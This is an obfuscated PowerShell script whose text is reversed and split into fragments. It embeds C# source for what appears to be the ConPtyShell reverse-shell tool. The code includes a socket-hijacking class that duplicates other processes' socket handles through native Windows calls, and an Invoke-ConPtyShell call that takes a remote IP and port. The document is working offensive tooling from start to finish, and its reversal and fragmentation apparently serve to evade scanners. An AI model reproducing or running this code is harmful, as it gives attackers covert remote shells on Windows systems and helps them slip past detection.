;)0 ,0 ,ofnIlocotorPasw fer ,locotorPi.ofnIlocotorPasw ,epyTtekcoSi.ofnIlocotorPasw ,ylimaFsserddAi.ofnIlocotorPasw(tekcoSASW = tekcoSdetacilpud            
.galf deppalrevo eht htiw detaerc neeb sah tekcos lanigiro eht fi dna erutcurts OFNI_LOCOTORPASW eht tes ew fi noitcnuf )(tekcoSASW yb )tes yllacitamotua dna( derongi eb lliw ti esuaceb ereh galf DEPPALREVO_GALF_ASW eht yficeps ot deen tUnJnod ew tub ssecorp ytpnoc eht rof tekcos deppalrevo na deen ew //            
{        
)0 == sutats( fi        
;)ofnIlocotorPasw fer ,dI.)(ssecorPtnerruCteG.ssecorP ,eldnaHtekcos(tekcoSetacilpuDASW = sutats tni        
;)(OFNI_LOCOTORPASW wen = ofnIlocotorPasw OFNI_LOCOTORPASW        
;oreZ.rtPtnI = tekcoSdetacilpud rtPtnI        
;oreZ.rtPtnI = tekcoSter rtPtnI        
{    
)eldnaHtekcos rtPtnI(eldnaHmorFtekcoSetacilpuD rtPtnI citats etavirp    
tekcos detacilpud a ot eldnah a snruter dna retemarap a sa tcejbo dfAq7JeciveDq7J a ot eldnah war a ekat noitcnuf siht //    

}    
;eurt nruter        
;)rtPofnIpct(labolGHeerF.lahsraM        
;0VofnIpct = tuOofnIpct        
;))0v_OFNI_PCT(foepyt ,rtPofnIpct(erutcurtSoTrtP.lahsraM)0v_OFNI_PCT( = 0VofnIpct 0v_OFNI_PCT        
}        
;eslaf nruter            
;)(0v_OFNI_PCT wen = tuOofnIpct            
;))(gnirtSoT.)(rorrEtsaLteGASW + YGK :rorretsalasw dna YGK + )(gnirtSoT.tluser + YGK edoc nruter htiw deliaf 1ltcoIASW :gubedYGK(eniLetirW.elosnoC //            
{        
)0 =! tluser( fi        
;)oreZ.rtPtnI ,oreZ.rtPtnI ,denruteRsetyb fer ,eziSofnIpct ,rtPofnIpct ,)noisreVofnIpct(fOeziS.lahsraM ,noisreVofnIpct fer ,OFNI_PCT_OIS ,tekcos(1ltcoIASW = tluser        
;)eziSofnIpct(labolGHcollA.lahsraM = rtPofnIpct rtPtnI        
;))0v_OFNI_PCT(foepyt(fOeziS.lahsraM = eziSofnIpct tni        
;0 = denruteRsetyb tni        
;0 = noisreVofnIpct 23tnIU        
;1- = tluser tni        
{    
)tuOofnIpct 0v_OFNI_PCT tuo ,tekcos rtPtnI(ofnIpcTtekcoSteG loob citats etavirp    

}    
;tuOstekcos nruter        
}        
;))(gnirtSoT.nIsetyB.nIsetyBkcos + YGK :deviecer setyb latot YGK + )YGK4XYGK(gnirtSoT.eldnah.nIsetyBkcos + YGKx0 eldnah tekcoS :gubedYGK(eniLetirW.elosnoC //            
;)eldnah.nIsetyBkcos(ddA.tuOstekcos            
{        
)nIsetyBstekcos ni nIsetyBkcos NISETYB_TEKCOS( hcaerof        
;)} ;))nIsetyB.b(oTerapmoC.nIsetyB.a( nruter { )b NISETYB_TEKCOS ,a NISETYB_TEKCOS( etageled(troS.nIsetyBstekcos            
tekcos reporp eht teg ot ecnahc rehgih a evah ew stekcos eht yb deviecer setyb rewef rof gniredro //            
)2 => tnuoC.nIsetyBstekcos( fi        
;tuOstekcos nruter )1 < tnuoC.nIsetyBstekcos( fi        
}        
;)kcos(tekcosesolc                
esle            
}            
;)nIsetyBkcos(ddA.nIsetyBstekcos                
;nIsetyB.ofnIkcos = nIsetyB.nIsetyBkcos                
;kcos = eldnah.nIsetyBkcos                
;)(NISETYB_TEKCOS wen = nIsetyBkcos NISETYB_TEKCOS                
{            
)dehsilbatsE.etatSpcT == etatS.ofnIkcos W3UW3U devieceRnyS.etatSpcT == etatS.ofnIkcos( fi            
tuo deretlif era stekcos gniamer eht ,stekcos evitca ylno deen ew //            
;))(gnirtSoT.etatS.ofnIkcos + YGK etatspct ni si YGK + )YGK4XYGK(gnirtSoT.kcos + YGKx0 eldnah tekcoS :gubedYGK(eniLetirW.elosnoC //            
}            
;eunitnoc                
;)kcos(tekcosesolc                
{            
))ofnIkcos tuo ,kcos(ofnIpcTtekcoSteG!( fi            
;)(0v_OFNI_PCT wen = ofnIkcos 0v_OFNI_PCT            
{        
)stekcos ni kcos rtPtnI( hcaerof        
;)(>rtPtnI<tsiL wen = tuOstekcos >rtPtnI<tsiL        
;)(>NISETYB_TEKCOS<tsiL wen = nIsetyBstekcos >NISETYB_TEKCOS<tsiL        
{    
)stekcos >rtPtnI<tsiL(nIsetyByBstekcoSredrOdnAretliF >rtPtnI<tsiL citats etavirp    

}    
;tuO'+'stekcoSdepud nruter        
;)kcos(eldnaHesolC            
)stekcos ni kcos rtPtnI( hcaerof        
seldnah tekcos lla gninaelc //        
}        
;)tekcoSdepud(ddA.tuOstekcoSdepud )oreZ.rtPtnI =! tekcoSdepud( fi            
;)kcos(eldnaHmorFtekcoSetacilpuD = tekcoSdepud rtPtnI            
{        
)stekcos ni kcos rtPtnI( hcaerof        
;tuOstekcoSdepud nruter )1 < tnuoC.stekcos( fi        
;)(>rtPt'+'nI<tsiL wen = tuOstekcoSdepud >rtPtnI<tsiL        
{    
)stekcos >rtPtnI<tsiL(seldnaHmorFstekcoSetacilpuD >rtPtnI<tsiL citats etavirp    

}    
;xednIepyT nruter        
;)ofnIsepyTrtp(labolGHeerF.lahsraM        
}        
}            
;kaerb                
;xednIepyT.epyT = xednIepyT                
{            
)emaNtcejbO == )2 / htgneL.emaNepyT.epyT ,reffuB.emaNepyT.epyT(inUgnirtSoTrtP.lahsraM && 0 > htgneL.emaNepyT.epyT( fi            
;)))2V_NOITAMROFNI_EPYT_TCEJBO(foepyt(fOeziS.lahsraM + )eziS.rtPtnI)gnol( ,htgneLmumixaM.emaNepyT.epyT(pUngilA + )(46tnIoT.tnerruCofnIsepyTrtp()rtPtnI( = tnerruCofnIsepyTrtp            
tcejbo 2V_NOITAMROFNI_EPYT_TCEJBO eht txen ot retniop evom //            
;))2V_NOITAMROFNI_EPYT_TCEJBO(foepyt ,tnerruCofnIsepyTrtp(erutcurtSoTrtP.lahsraM)2V_NOITAMROFNI_EPYT_TCEJBO( = epyT 2V_NOITAMROFNI_EPYT_TCEJBO            
{        
)++i ;tnuoCsepyT < i ;0 = i tni( rof        
;)eziS.rtPtnI + )(46tnIoT.ofnIsepyTrtp(rtPtnI wen = tnerruCofnIsepyTrtp rtPtnI        
2V_NOITAMROFNI_EPYT_TCEJBO fo sserdda tnemele tsrif eht ot retniop a etaerc //        
;)(46tnIoT.)ofnIsepyTrtp(rtPtnIdaeR.lahsraM = tnuoCsepyT        
;)(ofnIsepyTtcejbOyreuQ = ofnIsepyTrtp        
;oreZ.rtPtnI = ofnIsepyTrtp rtPtnI        
;0 = tnuoCsepyT gnol        
;0 = xednIepyT etyb        
{    
)emaNtcejbO gnirts(emaNyBxednIepyTteG etyb citats etavirp    
5673101219003780041/sutats/edoc_retnilps/moc.rettiwt//:sptth >-- ereh noitamrofni erom //    
znperx0@ ot seog siht rof stiderc //    
.sepyt xedni gnitnuoc fo YGKyawYGK )2+i( eht esu ot deen uoy noitulos cireneg erom a deen uoy fI .evoba dna 8niw morf ylno skrow siht //    

}    
;))1 - )ngila((~ & )1 - )ngila( + )sserdda((( nruter        
{    
)ngila gnol ,sserdda gnol(pUngilA gnol citats etavirp    
h.sotn/derahS/ecruoS/retsam/bolb/EMCAU/x0ferifh/moc.buhtig//:sptth >-- morf siht //    

}    
;noitamrofnIsepyTtcejbOrtp nruter        
;)0 ,noitamrofnIsepyTllAtcejbO.SSALC_NOITAMROFNI_TCEJBO ,oreZ.rtPtnI(cimanyDtcejbOyreuQtN = noitamrofnIsepyTtcejbOrtp        
;oreZ.rtPtnI = noitamrofnIsepyTtcejbOrtp rtPtnI        
{    
)(ofnIsepyTtcejbOyreuQ rtPtnI citats etavirp    

}    
}        
;)htgneLofni(labolGHcollA.lahsraM = rtPofni            
}            
;oreZ.rtPtnI nruter                
;)tluser + YGK sutatStN deldnahnUYGK(noitpecxE wen worht//                
{            
)LLAMSOOTREFFUB_SUTATSTN =! tluser && WOLFREVOREFFUB_SUTATSTN =! tluser && HCTAMSIMHTGNELOFNI_SUTATSTN =! tluser( fi            
lufsseccuS ton nehw retniop eerf//  ;)rtPofni(labolGHeerF.lahsraM            
;rtPofni nruter                
)SSECCUS_SUTATSTN == tluser( fi            
;2 * htgneLofni = htgneLofni            
;)htgneLofni fer ,htgneLofni ,rtPofni ,ssalCofni(noitamrofnImetsySyreuQtN)tniu( = tluser tniu            
{        
)eurt( elihw        
;)htgneLofni(labolGHcollA.lahsraM = rtPofni rtPtnI        
;00001x0 = htgneLofni            
)0 == htgneLofni( fi        
{    
)htgneLofni tni ,ssalCofni tni(cimanyDnoitamrofnImetsySyreuQtN rtPtnI citats etavirp    
noitacolla reffub YGKcimanydYGK htiw dohtem repleh//    
    
;)pgra tni fer ,dmc tni ,s rtPtnI(tekcosltcoi tni nretxe citats cilbup    
])YGKlld.23_2sWYGK(tropmIllD[    

;)htgneLreffuBtuptuO tni ,reffuBtuptuO TXETNOC_TEKCOS fer ,htgneLreffuBtupnI tni ,reffuBtupnI rtPtnI ,edoClortnoCoI tniu ,kcolBsutatSoI KCOLB_SUTATS_OI fer ,txetnoCcpA rtPtnI ,enituoRcpA rtPtnI ,tnevE rtPtnI ,eldnaHeliF rtPtnI(1eliFlortnoCoIeciveDtN tni nretxe citats etavirp    
])YGKeliFlortnoCoIeciveDtNYGK = tnioPyrtnE ,YGKlld.lldtnYGK(tropmIllD[    
edoClortnoCoI TXETNOC_TEG_DFA_LTCOI rof cificeps noitatnemelpmi 1eliFlortnoCoIeciveDtN //    

;)etatSlaitinI loob ,epyTtnevE tni ,setubirttAtcejbO rtPtnI ,sseccAderiseD tni ,eldnaHtnevE rtPtnI fer(tnevEetaerCtN tni nretxe citats etavirp    
])YGKlld.lldtnYGK(tropmIllD[    

;)sdnocesilliMwd 23tnIU ,eldnaHh rtPtnI(tcejbOelgniSroFtiaW 23tnIU nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)htgneLnruter tni fer ,htgneLnoitamrofnImetsyS tni ,noitamrofnImetsyS rtPtnI ,ssalCnoitamrofnImetsyS tni(noitamrofnImetsySyreuQtN tniu nretxe citats etavirp    
])YGKlld.lldtnYGK(tropmIllD[    

;)htgneLnruter tni fer ,htgneLnoitamrofni tniu ,rtPnoitamrofni rtPtnI ,ssalCnoitamrofni SSALC_NOITAMROFNI_TCEJBO ,eldnaHtcejbo rtPtnI(tcejbOyreuQtN tniu nretxe citats etavirp    
])YGKlld.lldtnYGK(tropmIllD[    

;)(ssecorPtnerruCteG rtPtnI nretxe citats etavirp    
])YGKlld.23lenrekYGK(tropmIllD[    

;)tcejbOh rtPtnI(eldnaHesolC loob nretxe citats etavirp    
])YGKlld.23lenrekYGK(tropmIllD[    

;)snoitpOwd tniu ,eldnaHtirehnIb loob ])looB.epyTdeganamnU(sAlahsraM[ ,sseccAderiseDwd tniu ,eldnaHtegraTpl rtPtnI tuo ,eldnaHssecorPtegraTh rtPtnI ,eldnaHecruoSh rtPtnI ,eldnaHssecorPecruoSh rtPtnI(eldnaHetacilpuD loob nretxe citats etavirp    
])looB.epyTdeganamnU(sAlahsraM :nruter[    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)dIssecorp tni ,eldnaHtirehnIb loob ,sseccAssecorp tni(ssecorPnepO rtPtnI nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)s rtPtnI(tekcosesolc tni nretxe citats etavirp    
])eurt = rorrEtsaLteS ,edocinU.teSrahC = teSrahC ,YGKlld.23_2swYGK(tropmIllD[    

;)enituoRnoitelpmoCpl rtPtnI ,deppalrevOpl rtPtnI ,denruteRsetyBbcpl tni fer ,reffuBtuObc tni ,reffuBtuOvpl rtPtnI ,reffuBnIbc tni ,reffuBnIvpl 23tnIU fer ,edoClortnoCoIwd tni ,s rtPtnI(1ltcoIASW tni nretxe citats cilbup    
])YGKltcoIASWYGK = tnioPyrtnE ,eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKlld.23_2sWYGK(tropmIllD[   '+' 
edoc lortnoc OFNI_PCT_OIS rof cificeps noitatnemelpmi 1ltcoIASW //    

;)neleman tni fer ,eman NI_RDDAKCOS fer ,s rtPtnI(em'+'anreepteg tni nretxe citats etavirp    
])llaCdtS.noitnevnoCgnillaC = noitnevnoCgnillaC ,eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKlld.23_2swYGK(tropmIllD[    

;)(rorrEtsaLteGASW 23tnI nretxe citats etavirp    
])otuA.teSrahC = teSrahC ,YGKlld.23_2swYGK(t'+'ropmIllD[    

;)sgalFwd tni ,1puorg 23tnI ,ofnIlocotorPpl OFNI_LOCOTORPASW fer ,epyTlocotorp tni ]nI[ ,epyTtekcos tni ]nI[ ,ylimaFsserdda tni ]nI[(tekcoSASW rtPtnI nretxe citats etavirp    
])llaCdtS.noitnevnoCgnillaC = noitnevnoCgnillaC ,eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKlld.23_2swYGK(tropmIllD[    

;)reffuBdennip OFNI_LOCOTORPASW fer ,dIssecorp tni ,eldnaHtekcos rtPtnI(tekcoSetacilpuDASW tni nretxe citats etavirp    
])eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKLLD.23_2SWYGK(tropmIllD[    


}    
;nIsetyB 46tnIU cilbup        
;eldnah rtPtnI cilbup        
{    
NISETYB_TEKCOS tcurts etavirp    

}    
;ataDrepleH ][etyb cilbup        
])42 = tsnoCeziS ,yarrAlaVyB.epyTdeganamnU(sAlahsraM[        
gnisrever emos htiw tuo dnuof - ataD repleH //        
;sserddAetomeR RDDAKCOS cilbup        
;sserddAlacoL RDDAKCOS cilbup        
;gniddaP 23tnIU cilbup        
;ataDrepleHfOeziS 23tnIU cilbup        
;ataDderahS OFNI_DERAHS_KCOS cilbup        
{    
TXETNOC_TEKCOS tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[ '+'   

}    
;atad_as ][e'+'tyb cilbup        
])41 = tsnoCeziS ,yarrAlaVyB.epyTdeganamnU(sAlahsraM[        
;ylimaf_as 61tnIU cilbup        
{    
RDDAKCOS tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;stnevEtceleScnysAdelbasiD 23tnI cilbup        
;tnevEltceleScnysA 23tnI cilbup        
;gsMwtceleScnysA 23tnIU cilbup        
;rebmuNlaireStceleScnysA 23tnIU cilbup        
;dnWhtceleScnysA rtPtnI cilbup        
)(tceleScnysAASW rof derots ofnI //        
;rorrEtsaL 23tnI cilbup        
tekcos siht no tes rorre tsaL //        
;ytiroirPpuorG 23tnI cilbup        
;epyTpuorG EPYT_PUORG_DFA cilbup        
;DIpuorG 23tnIU cilbup        
;sgalFredivorP 23tnIU cilbup        
;1sgalFecivreS 2'+'3tnIU cilbup        
;dIyrtnEgolataC 23tnIU cilbup        
;sgalFnoitaerC 23tnIU cilbup        
tekcos siht gnitaerc nehw )(tekcoSPSW otni dessap sretemarap lareves fo tohspanS //        
;ytreporPtekcoS trohsu cilbup        
/*        
;tpeccAlanoitidnoC            
;nwodtuhSdneS            
;nwodtuhSevieceR            
;dracdliWesUtnoD            
;gnikcolBnoN            
;esUsserddAevisulcxE            
;sesserddAesueR            
;enilnIboO            
;gubeD            
;tsacdaorB            
;gninetsiL            
:redro reporp ,ytreorPtekcoS eht ni stib eht era esohT */        
;eziSreffuBdneS 23tnIU cilbup        
;eziSreffuBevieceR 23tnIU cilbup        
;tuoemiTevieceR 23tnIU cilbup        
;tuoemiTdneS 23tnIU cilbup        
;ofnIregniL regnil cilbup        
.)(tpokcostes ,)(tpokcosteg yb dellortnoc snoitpo tekcoS //        

;htgneLsserddAetomeR 23tnI cilbup        
;htgneLsserddAlacoL 23tnI cilbup        
;locotorP 23tnI cilbup        
;epyTtekcoS 23tnI cilbup        
;ylimaFsserddA 23tnI cilbup        
;etatS ETATS_TEKCOS cilbup        
{    
OFNI_DERAHS_KCOS tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;noitamrofni rtPtnI cilbup        
;sutats tni cilbup        
{    
KCOLB_SUTATS_OI tcurts etavirp    
])0 = kcaP ,laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;regnil_l 61tnIU cilbup        
;ffono_l 61tnIU cilbup        
{    
regnil tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;snarteRnyS etyb cilbup        
;sedosipEtuoemiT 23tnIU cilbup        
;nIskcApuD 23tnIU cilbup        
;snarteRtsaF 23tnIU cilbup        
;snarteRsetyB 23tnIU cilbup        
;deredroeRsetyB 23tnIU cilbup        
;nIsetyB 46tnIU cilbup        
;tuOsetyB 46tnIU cilbup        
;fuBvcR 23tnIU cilbup        
;dnWvcR 23tnIU cilbup        
;dnWdnS 23tnIU cilbup        
;dnwC 23tnIU cilbup        
;thgilFnIsetyB 23tnIU cilbup        
;sUttRniM 23tnIU cilbup        
;sUttR 23tnIU cilbup        
;delbanEspmatsemiT etyb cilbup        
;sMemiTnoitcennoC 46tnIU cilbup        
;ssM 23tnIU cilbup        
;etatS etatSpcT cilbup        
{    
0v_OFNI_PCT tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;orez_nis gnol cilbup        
;rdda_nis tniu cilbup        
;trop_nis trohs cilbup        
;ylimaf_nis trohs cilbup        
{    
NI_RDDAKCOS tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;locotorPzs gnirts cilbup        
])652 = tsnoCeziS ,rtSTlaVyB.epyTdeganamnU(sAlahsraM[        
;devreseRredivorPwd tniu cilbup        
;eziSegasseMwd tniu cilbup        
;emehcSytiruceSi tni cilbup        
;redrOetyBkrowteNi tni cilbup        
;tesffOxaMlocotorPi tni cilbup        
;locotorPi tni cilbup        
;epyTtekcoSi tni cilbup        
;rddAkcoSniMi tni cilbup        
;rddAkcoSxaMi tni cilbup        
;ylimaFsserddAi tni cilbup        
;noisreVi tni cilbup        
;niahClocotorP NIAHCLOCOTORPASW cilbup        
;dIyrtnEgolataCwd tniu cilbup        
;dIredivorP diuG cilbup        
;sgalFredivorPwd tniu cilbup        
;4sgalFecivreSwd tniu cilbup        
;3sgalFecivreSwd tniu cilbup        
;2sgalFecivreSwd tniu cilbup        
;1sgalFecivreSwd tniu cilbup        
{    
OFNI_LOCOTORPASW tcurts etavirp    
])otuA.teSrahC = teSrahC ,laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;seirtnEniahC ][tniu cilbup        
])7 = tsnoCeziS ,yarrAlaVyB.epyTdeganamnU(sAlahsraM[        
;neLniahC tni cilbup        
{    
NIAHCLOCOTORPASW tcurts etavirp    
])otuA.teSrahC = teSrahC ,laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;sutatSmetsySzs gnirts cilbup        
])921 = tsnoCeziS ,rtSTlaVyB.epyTdeganamnU(sAlahsraM[        
;noitpircseDzs gnirts cilbup        
])752 = tsnoCeziS ,rtSTlaVyB.epyTdeganamnU(sAlahsraM[        
;ofnIrodneVpl rtPtnI cilbup        
;gDpdUxaMi trohs cilbup        
;stekcoSxaMi trohs cilbup        
;noisreVhgiHw trohs cilbup        
;noisreVw trohs cilbup        
{    
ataDASW tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;reffuB rtPtnI cilbup        
;htgneLmumixaM trohsu cilbup        
;htgneL trohsu cilbup        
{    
GNIRTS_EDOCINU tcurts etavirp    
])laitneu'+'qeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;emaN GNIRTS_EDOCINU cilbup        
{    
NOITAMROFNI_EMAN_TCEJBO tcurts etavirp    
])1 = kcaP ,laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;egasUlooPdegaPnoN//;egrahClooPdegaPnoNtluafeD tniu cilbup        
;egasUlooPdegaP //;egrahClooPdegaPtluafeD tniu cilbup        
;epyTlooP tniu cilbup        
;etyBdevreseR etyb cilbup        
;xednIepyT etyb cilbup        
loob//;tnuoCeldnaHniatniaM etyb cilbup        
loob//;deriuqeRytiruceS etyb cilbup      '+'  
;ksaMsseccAdilaV tniu cilbup        
;gnippaMcireneG GNIPPAM_CIRENEG cilbup        
;setubirttAdilavnI tniu cilbup        
;egasUelbaTeldnaHretaWhgi'+'H tniu cilbup        
;egasUlooPemaNretaWhgiH tniu cilbup        
;egasUlooPdegaPnoNretaWhgiH tniu cilbup        
;egasUlooPdegaPretaWhgiH tniu cilbup        
;tnuoCeldnaHkaeP //;seldnaHfOrebmuNretaWhgiH tniu cilbup        
;tnuoCtcejbOkaeP //;stcejbOfOrebmuNretaWhgiH tniu cilbup        
;egasUelbaTeldnaHlatoT tniu cilbup        
;egasUlooPemaNlatoT tniu cilbup        
;egasUlooPdegaPnoNlatoT tniu cilbup        
;egasUlooPdegaPlatoT tniu cilbup        
;seldnaHfOrebmuNlatoT tniu cilbup        
;stcejbOfOrebmuNlatoT tniu cilbup        
;emaNepyT GNIRTS_EDOCINU cilbup        
{    
2V_NOITAMROFNI_EPYT_TCEJBO tcurts etavirp    
])1 = kcaP ,laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;llAcireneG tni cilbup        
;etucexEcireneG tni cilbup        
;etirWcireneG tni cilbup        
;daeRcireneG tni cilbup        
{    
GNIPPAM_CIRENEG tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;sseccAdetnarG rtPtnI cilbup        
;tcejbO rtPtnI cilbup        
;eulaVeldnaH trohsu cilbup        
;setubirttAeldnaH etyb cilbup        
;xednIepyTtcejbO etyb cilbup        
;xednIecarTkcaBrotaerC trohsu cilbup        
;dIssecorPeuqinU trohsu cilbup        
{    
OFNI_YRTNE_ELBAT_ELDNAH_METSYS tcurts etavirp    
])1 = kcaP ,laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
4 = noitamrofnIeldnaHtcejbO        
,3 = noitamrofnIsepyTllAtcejbO        
,2 = noitamrofnIepyTtcejbO        
,1 = noitamrofnIemaNtcejbO        
,0 = noitamrofnIcisaBtcejbO        
{    
tni : SSALC_NOITAMROFNI_TCEJBO mune cilbup    

}    
PUORG_DENIARTSNOCNU_GS = deniartsnocnUepyTpuorG        
,PUORG_DENIARTSNOC_GS = deniartsnoCepyTpuorG        
,0 = rehtieNepyTpuorG        
{    
tniu : EPYT_PUORG_DFA mune etavirp    

}    
3 = de'+'solCtekcoS        
,3 = detcennoCtekcoS        
,2 = pdUdnuoBtekcoS        
,1 = dnuoBtekcoS        
,0 = nepOtekcoS        
{    
tniu : ETATS_TEKCOS mune etavirp    


;FFFFFFFFx0 = ETINIFNI 23tnIU tsnoc etavirp    
;1 = tnevEnoitazinorhcnyS tni tsnoc etavirp    
;3000f1x0 = SSECCA_LLA_TNEVE tni tsnoc etavirp    
;34021x0 = TXETNOC_TEG_DFA_LTCOI tniu tsnoc etavirp    
;2x0 = P'+'UORG_D'+'ENIARTSNOC_GS tni tsnoc etavirp    
;1x0 = PUORG_DENIARTSNOCNU_GS tni tsnoc etavirp    
;)7200008Dx0)tni((dekcehcnu = OFNI_PCT_OIS tni tsnoc etavirp    
;0400x0 = ELDNAH_PUD_SSECORP tni tsnoc etavirp    
;61 = noitamrofnIeldnaHmetsyS tni tsnoc etavirp    
;2x0 = SSECCA_EMAS_ETACILPUD tni tsnoc etavirp    
;1x0 = DEPPALREVO_GALF_ASW tni tsnoc etavirp    
;30100000x0 = GNIDNEP_SUTATSTN tni tsnoc etavirp    
;3200000cx0 = LLAMSOOTREFFUB_SUTATSTN tniu tsnoc etavirp    
;50000008x0 = WOLFREVOREFFUB_SUTATSTN tniu tsnoc etavirp    
;4000000cx0 = HCTAMSIMHTGNELOFNI_SUTATSTN tniu tsnoc etavirp    
;00000000x0 = SSECCUS_SUTATSTN tniu tsnoc etavirp    

{
gnikcajiHtekcoS ssalc citats cilbup

}
}    
;detceteDkcoldaed.siht nruter        
;)daerhTh(eldnaHesolC        
(: sdaerht fo etsaw emos tsuj//        
.sdaerht dekcol no ti od ew fi ssecorp elohw eht hsarc lliw ti esuaceb )(daerhTetanimreT htiw ereh sdaerht YGKgnidnepYGK eht llik ton od ew//        
;)0051 ,daerhTh(tcejbOelgniSroFtiaW        
;)dIdaerht tuo ,0 ,oreZ.rtPtnI ,kcoldaeDkcehCdaerhTetageled ,0 ,0(daerhTetaerC = daerhTh        
...sniag on'+' niap on ...skcoldaed on sgnah oN ...os epip deman no sgnah sdiova ot deen eW .kcol ni og dna gnah sdaerht #C ,sdaerht evitan deen ew//        
;0 = dIdaerht tniu        
;oreZ.rtPtnI = daerhTh rtPtnI        
;)kcoldaeDkcehCdaerhT.siht(ENITUOR_TRATS_DAERHTPL wen = kcoldaeDkcehCdaerhTetageled ENITUOR_TRATS_DAERHTPL        
;eldnaHt = eldnaHtegrat.siht        
;eurt = detceteDkcoldaed.siht        
{    
)eldnaHt rtPtnI(detceteDkcoldaeDkcehC loob cilbup    

}    
;0 nruter        
;)rtPjbo(labolGHeerF.lahsraM )oreZ.rtPtnI =! rtPjbo( fi        
;eslaf = detceteDkcoldaed.siht        
;)0 ,noitamrofnIemaNtcejbO.SSALC_NOITAMROFNI_TCEJBO.gnikcajiHtekcoS ,eldnaHtegrat.siht(cimanyDtcejbOyreuQtN.gnikcajiHtekcoS = rtPjbo        
;oreZ.rtPtnI = rtPjbo rtPtnI        
{    
)smaraPdaerht tniu(kcoldaeDkcehCdaerhT tniu etavirp    

;)dIdaerhTpl tniu tuo ,sgalFnoitaerCwd tniu ,retemaraPpl '+'rtPtnI ,sserddAtratSpl ENITUOR_TRATS_DAERHTPL ,eziSkcatSwd tniu ,setubirttAdaerhTpl tniu(daerhTetaerC rtPtnI nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenreKYGK(tropmIllD[    

;)sdnocesilliMwd 23tnIU ,eldnaHh rtPtnI(tcejbOelgniSroFtiaW 23tnIU nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)tcejbOh rtPtnI(eldnaHesolC loob nretxe citats etavirp    
])YGKlld.23lenrekYGK(tropmIllD[    

;)maraPpl tniu(ENITUOR_TRATS_DAERHTPL tniu etageled etavirp    

;eldnaHtegrat rtPtnI etavirp    
;detceteDkcoldaed loob etavirp    

{
repleHkcehCkcoldaeD ssalc cilbup

}
} { )egassem + gnirts_rorre(esab : )egassem gnirts(noitpecxEllehSytPnoC cilbup    

} { )(noitpecxEllehSytPnoC cilbup    

;YGK :noitpecxEllehSytPnoC ]-[YGK = gnirts_rorre gnirts tsnoc etavirp    
{
noitpecxE : noitpecxEllehSytPnoC ssalc cilbup

;cireneG.snoitcelloC.metsyS gnisu
;scitsongaiD.metsyS gnisu
;secivreSporetnI.emitnuR.metsyS gnisu
;noitamrofnIkrowteN.teN.metsyS gnisu
;stekcoS.teN.metsyS gnisu
;teN.metsyS gnisu
;gnidaerhT.metsyS gnisu
;txeT.metsyS gnisu
;OI.metsyS gnisu
;metsyS gnisu

YGK@( eulaV- EcruOS emaN- elbairaV-teS

}
}tU3ZwPT3ZwUO{sxE )UnJWUnJ,UnJtUnJ,UnJetirUnJ,UnJuptuO-UnJ f- YGK}2{}0{}1{}3{YGK(&    
))}LlehSy3ZwTP3ZwN3ZwocSrET3Zwe3ZwMarAP{sxE(ekovnI.)UnJiaMlleUnJ,UnJnUnJ,UnJtPnoCUnJ,UnJhSUnJ,UnJyUnJf-YGK}3{}4{}1{}0{}2{YGK(::YGKEUlA3ZwvYGK.) )UnJMUnJ+UnJNUnJ+UnJPulUnJ+UnJ:elbaIrAVUnJ( metI-tEg (( eulaV- TUpTuo emaN- elbairaV-teS    
;}eCRUO3ZwS{sxE noitinifeDepyT- )UnJpUnJ,UnJrahSCUnJ f-YGK}1{}0{YGK( egaugnaL- )UnJepUnJ,UnJyTUnJ,UnJ-ddAUnJf- YGK}2{}1{}0{YGK(&    
))}ENIL3ZwdnA3ZwMmo3Zwc{sxE ,}sl3ZwoC{sxE ,}Swo3ZwR{sxE ,}TR3Zwop3ZwETOmEr{sxE ,}PiET3ZwoM3ZwER{sxE(@( eulaV- LLehSyTpnOCsreTeMarap emaN- elbairaV-teS    
}    
}        
)UnJretemarapUnJ,UnJ troUnJ,UnJPetUnJ,UnJomeRUnJ,UnJ UnJ,UnJsimUnJ,UnJsUnJ,UnJgniUnJ f- YGK}7{}3{}0{}1{}2{}6{}5{}4{YGK( worht            
{ ))))UnJomeRUnJ,UnJtroUnJ,UnJPetUnJ f- YGK}1{}0{}2{YGK((e'+'kovnI.)UnJatnoCUnJ,UnJsniUnJ,UnJyeKUnJ f-YGK}0{}1{}2{YGK(.}srET3ZwEMA3ZwRA3ZwpDNU3ZwoB3ZwsP{sxE(toN-(fi        
        
}        
)UnJtUnJ,UnJretUnJ,UnJemarap gnissiUnJ,UnJomeRUnJ,UnJm pIeUnJf- YGK}3{}2{}0{}4{}1{YGK( worht            
{ ))))UnJtomeUnJ,UnJpIeUnJ,UnJRUnJ f-YGK}1{}2{}0{YGK((ekovnI.)UnJKsniatnUnJ,UnJoCUnJ,UnJyeUnJ f- YGK}0{}2{}1{YGK(.}SrETEmAR3ZwaPD3ZwNuOB3Zws3Zwp{sxE(toN-(fi        
  
{esle    
}    
